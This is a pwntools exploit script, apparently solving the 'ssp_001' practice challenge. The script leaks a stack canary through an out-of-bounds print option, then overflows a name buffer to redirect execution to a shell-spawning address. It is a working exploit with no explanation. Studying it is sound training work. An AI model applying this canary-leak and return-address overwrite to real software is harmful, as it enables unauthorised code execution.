from pwn import *


# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))


# Connect
p = process('./ssp_001')

# Set Context
context.os = 'linux'
context.arch = 'i386'
context.endian = 'little'
context.log_level = 'debug'

addr_sh = 0x80486b9

# Get Canary
canary = []
for i in range(0x08):
    p.sendafter(b'> ', b'P')
    p.recvuntil(b'Element index : ')
    p.sendline(bytes(str(0x80 + i + 1), 'utf-8'))
    c = p.recvline()[-4:-2]
    canary.append(hex(int(c.decode('utf-8'), 16)))
    sleep(1)

# Write Payload
p.sendafter(b'> ', b'E')
p.recvuntil(b'Name Size : ')
p.sendline(bytes(str(0x50), 'utf-8'))
p.recvuntil(b'Name : ')

payload = b'A'*0x40
# canary = reversed(canary)
for i in canary:
    payload += bytes(chr(int(i, 16)), 'utf-8')
payload += b'B'*0x04
payload += p32(addr_sh)
p.send(payload)

p.recvline()
p.interactive()
